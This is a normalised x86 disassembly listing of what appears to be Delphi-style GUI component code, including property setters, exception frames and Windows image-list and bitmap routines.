je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_447d40
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_45c9d8
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff0
call sub_403420
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_419de4
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb03f
call sub_438b08
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_447d98
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4193f0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ ebx + 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_447f1c
mov [ ebx + 0x58 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_447e04
push ebx
push esi
push edi
call sub_403598
mov ebx edx
mov edi eax
mov eax [ edi + 0x34 ]
call sub_403224
jmp r-xdata
mov esi [ edi + 0x30 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_413a00
call sub_403224
mov eax [ edi + 0x30 ]
call sub_403224
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41943c
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403580
sub_447e54
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_447e9c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_413974
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033d4
mov edx edi
call sub_447c20
sub_447ee8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x38 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x34 ]
call sub_44978c
pop esi
pop ebx
retn
mov edx [ ebx + 0x34 ]
call sub_4497d0
mov edx ebx
mov eax [ ebx + 0x38 ]
call sub_4194c0
sub_447f28
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41970c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x38 ]
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax esi
call sub_447f90
sub_447f70
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_4137bc
mov [ esi + 0x5c ] ebx
mov edx ebx
mov eax esi
call sub_4194c0
pop esi
pop ebx
retn
sub_447f90
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_413a5c
test eax eax
jl r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x5c ] eax
sub_447fac
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
test [ ebx + 0x1c ] 0x10
je r-xdata
inc esi
xor edi edi
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
dec esi
jne r-xdata
cmp [ esi + 0x250 ] 0x0
je r-xdata
mov eax [ esi + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_448014
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esi + 0x8 ]
call sub_452888
mov ebx eax
mov ax [ esi + 0x4 ]
mov edx ebx
call sub_44b028
mov ebp eax
test bp bp
je r-xdata
xor eax eax
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp bp [ ebx + 0x84 ]
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + edi * 4 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
jmp r-xdata
cmp [ ebx + 0x90 ] 0x0
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4488bc
mov edx ebp
call sub_44891c
inc eax
je r-xdata
sub_4480a0
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x4a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_4480c0
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x52 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_4480e0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x58 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x1 ] al
mov al [ esp ]
mov [ ebx + 0x58 ] al
cmp al 0x1
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
inc esi
xor ebp ebp
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
test edi edi
je r-xdata
dec al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
cmp [ esp + 0x1 ] 0x2
jne r-xdata
test edi edi
je r-xdata
jmp r-xdata
inc ebp
dec esi
jne r-xdata
mov dl [ edi + 0x94 ]
mov eax edi
call sub_448530
cmp [ esp ] 0x2
jne r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov edi [ eax + ebp * 4 ]
mov al [ esp ]
sub al 0x1
jb r-xdata
mov al [ edi + 0x6a ]
mov [ edi + 0x94 ] al
mov dl 0x1
mov eax edi
call sub_448530
sub_448278
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419cf8
mov [ esi + 0x6a ] 0x1
mov [ esi + 0x80 ] 0xffffffff
mov [ esi + 0x86 ] 0x1
xor eax eax
mov [ esi + 0x90 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax esi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_4482cc
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
mov eax [ esi + 0x98 ]
call sub_403224
mov eax [ esi + 0x9c ]
call sub_403224
cmp [ esi + 0x90 ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_447b7c
test bl bl
jle r-xdata
lea eax [ esi + 0x90 ]
call sub_40ccd0
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_44831c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_413fa0
mov edx [ ebx + 0x64 ]
mov edi esi
mov eax edi
call sub_4483c8
mov dl [ ebx + 0x69 ]
mov eax edi
call sub_448428
mov dl [ ebx + 0x6a ]
mov eax edi
call sub_448530
mov edx [ ebx + 0x74 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x7c ]
mov eax edi
call sub_448668
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_4486c8
mov dx [ ebx + 0x84 ]
mov eax edi
call sub_448724
mov dl [ ebx + 0x86 ]
mov eax edi
call sub_448788
push [ ebx + 0x44 ]
push [ ebx + 0x40 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax [ ebx + 0x48 ]
mov [ edi + 0x48 ] eax
mov eax [ ebx + 0x4c ]
mov [ edi + 0x4c ] eax
mov eax [ ebx + 0x38 ]
mov [ edi + 0x38 ] eax
mov eax [ ebx + 0x3c ]
mov [ edi + 0x3c ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4483c8
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x64 ]
call sub_404368
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x64 ]
mov edx [ esp ]
call sub_403fb0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4033d4
test eax eax
je r-xdata
sub_448428
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x68 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x1
xor edx edx
push ebp
push sub_448520
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x69 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x69 ] bl
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jle r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x69 ] 0x0
je r-xdata
inc esi
dec edi
jne r-xdata
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
call sub_447ee0
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_4033d4
test eax eax
je r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx esi
call sub_447ecc
mov ebx eax
cmp ebx [ ebp - 0x4 ]
je r-xdata
mov eax [ ebx + 0x6c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x6c ]
jne r-xdata
xor edx edx
mov eax ebx
call sub_448428
sub_448530
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x6a ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov dl [ eax + 0x58 ]
cmp dl 0x1
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
cmp dl 0x2
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
jmp r-xdata
inc edi
dec esi
jne r-xdata
mov dl [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ esp ] 0x1
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4033d4
test eax eax
je r-xdata
sub_4485a8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax ebp
mov edx [ ebx + 0x78 ]
call sub_404368
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
lea eax [ ebx + 0x78 ]
mov edx ebp
call sub_403fb0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_413918
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_413918
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
sub_448610
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x74 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x74 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4033d4
test eax eax
je r-xdata
sub_448668
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x7c ]
call sub_404368
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x7c ]
mov edx [ esp ]
call sub_403fb0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4033d4
test eax eax
je r-xdata
sub_4486c8
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x80 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x80 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4033d4
test eax eax
je r-xdata
sub_448724
push ebx
push esi
push edi
push ecx
mov [ esp ] dx
mov ebx eax
mov ax [ esp ]
cmp ax [ ebx + 0x84 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov ax [ esp ]
mov [ ebx + 0x84 ] ax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov dx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4033d4
test eax eax
je r-xdata
sub_448788
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x86 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebp + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebp + 0x86 ] bl
mov eax ebp
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_413918
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ ebp + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_4033d4
test eax eax
je r-xdata
sub_4487e8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x64 ]
call sub_404368
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov ebx eax
mov edx edi
mov eax esi
call sub_419948
test bl bl
je r-xdata
mov al 0x1
test [ ebx + 0x1c ] 0x1
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_4483c8
sub_448834
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x8a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_44885c
push ebx
mov ebx eax
xor eax eax
mov edx [ ebx + 0x5c ]
test edx edx
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x44 ]
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ edx + 0x58 ] 0x0
jne r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x95 ] 0x0
je r-xdata
pop ebx
retn
xor eax eax
jmp r-xdata
mov eax ebx
call sub_447ce8
test al al
jne r-xdata
cmp [ ebx + 0x69 ] 0x0
je r-xdata
mov al 0x1
mov dl [ ebx + 0x69 ]
xor dl 0x1
mov eax ebx
call sub_448428
cmp [ ebx + 0x69 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
sub_4488f0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_415098
mov edi eax
mov eax esi
call sub_44b314
movzx ecx ax
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_44891c
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0xffffffff
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ esp ] ebx
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp bp ax
jne r-xdata
sub_448960
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_448985
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44898c
retn
sub_448b50
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4193f0
mov [ esi + 0x34 ] 0x10
mov [ esi + 0x30 ] 0x10
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax esi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_448b9c
push ebx
push esi
push edi
call sub_403598
mov ebx edx
mov edi eax
jmp r-xdata
mov esi [ edi + 0x4c ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_413a00
mov edx eax
mov eax edi
call sub_44978c
mov eax [ edi + 0x50 ]
call sub_403224
mov eax edi
call sub_448e60
mov eax [ edi + 0x4c ]
call sub_403224
xor eax eax
mov [ edi + 0x4c ] eax
mov eax [ edi + 0x54 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41943c
test bl bl
jle r-xdata
call sub_403224
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403580
sub_448c08
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_448cb5
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ ebx + 0x4c ] eax
mov eax [ ebx + 0x30 ]
cmp eax 0x1
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3f0
call sub_403998
cmp eax 0x8000
jg r-xdata
cmp [ ebx + 0x34 ] 0x1
jge r-xdata
mov [ ebx + 0x38 ] 0x4
mov [ ebx + 0x41 ] 0x1
mov dl 0x2
mov eax ebx
call sub_449714
mov [ ebx + 0x43 ] 0x0
mov [ ebx + 0x44 ] 0x1fffffff
mov [ ebx + 0x48 ] 0x1fffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fc28
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_448cd4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448cbc
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
sub_448cd4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_448d75
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleBitmap
mov edx eax
mov eax ebx
call sub_420d10
mov eax ebx
call sub_4201f0
mov eax [ eax + 0x14 ]
xor edx edx
call sub_41cc90
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_4124e4
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_4201f0
pop edx
call sub_41d034
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448d7c
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_448d98
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax [ ebx + 0x34 ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
push esp
lea eax [ esp + 0x8 ]
push eax
push edx
call ImageList_GetIconSize
mov eax [ esp + 0x4 ]
mov [ ebx + 0x34 ] eax
mov eax [ esp ]
mov [ ebx + 0x30 ] eax
mov eax ebx
call sub_448cd4
pop ecx
pop edx
pop ebx
retn
sub_448dd0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_448e60
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_448d98
mov [ ebx + 0x3c ] esi
mov eax ebx
mov si 0xffef
call sub_403420
sub_448e0c
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_44969c
test ebx ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov eax ebx
call sub_42025c
cmp al 0x1
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_448e60
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_448cc0
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x3c ] eax
mov eax ebx
mov si 0xffef
call sub_403420
pop esi
pop ebx
retn
cmp [ ebx + 0x42 ] 0x0
jne r-xdata
mov eax ebx
call sub_448dfc
push eax
call ImageList_Destroy
sub_448e98
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_448f2b
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x38 ]
push esi
push esi
xor eax eax
mov al [ ebx + 0x41 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xfe
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
call ImageList_Create
mov [ ebx + 0x3c ] eax
mov eax ebx
call sub_448cc0
test al al
jne r-xdata
mov eax [ ebx + 0x44 ]
cmp eax 0x1fffffff
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3f0
call sub_403998
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448f32
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
mov edx eax
mov eax ebx
call sub_4490c0
sub_448f38
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fc28
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_448fe7
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fc28
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_448fca
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_448cc8
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_448e0c
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_448e0c
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448fd1
mov eax [ ebp - 0x10 ]
call sub_403224
retn
sub_449004
push ebx
mov ebx eax
mov eax ebx
call sub_448cc0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_448dfc
push eax
call ImageList_GetImageCount
pop ebx
retn
sub_449028
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4490a7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_449004
cmp esi eax
jl r-xdata
mov eax ebx
call sub_448cc0
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3f0
call sub_403998
mov eax ebx
mov si 0xffef
call sub_403420
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4490ae
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
push esi
mov eax ebx
call sub_448dfc
push eax
call ImageList_Remove
sub_4490c0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_448cc0
test al al
je r-xdata
